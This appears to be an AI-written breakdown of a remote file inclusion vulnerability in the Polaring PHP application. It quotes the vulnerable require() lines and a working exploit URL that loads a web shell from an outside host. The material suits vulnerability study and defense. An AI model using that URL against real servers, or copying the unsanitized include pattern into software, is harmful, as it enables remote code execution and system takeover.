Based on the provided content, here's a breakdown of the vulnerability:

**Root cause of vulnerability:**
The Polaring application fails to properly sanitize user input when handling the `$_SESSION['dirMain']` variable within the `general.php` file. The application uses this variable in `require()` statements, allowing an attacker to inject a malicious URL.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is that the application includes files based on user-supplied input without proper validation.

**Impact of exploitation:**
- **Arbitrary Code Execution:** An attacker can execute arbitrary code on the server by including a malicious file from a remote server. This could lead to complete system compromise.

**Attack vectors:**
- **HTTP GET Request:** The attacker manipulates the `$_SESSION['dirMain']` parameter in a GET request to the vulnerable `general.php` page.

**Required attacker capabilities/position:**
- **Network Access:** The attacker needs to have network access to the vulnerable application.
- **Knowledge of the vulnerable parameter:** The attacker must be aware of the `$_SESSION['dirMain']` parameter and how it is used in the application.

**Technical Details:**
The vulnerable code snippet in `general.php` shows the insecure use of the `$_SESSION['dirMain']` variable in `require` statements, specifically:
```php
require($_SESSION['dirMain'].'/view/css.php');
require($_SESSION['dirMain'].'/view/frontpage.php');
require($_SESSION['dirMain'].'/view/navigation.php');
require($_SESSION['dirMain'].'/view/gmaps.php');
require($_SESSION['dirMain'].'/view/errorReport.php');
```
The exploit example demonstrates how an attacker can inject a malicious URL:
```
http://www.site.com/polaring_dir/view/general.php?_SESSION['dirMain']=http://marcusbestlamer.gay/shell.php?
```
This injects a malicious URL into the `$_SESSION['dirMain']` variable which is then included by the `require` function, resulting in the execution of the attacker's code.
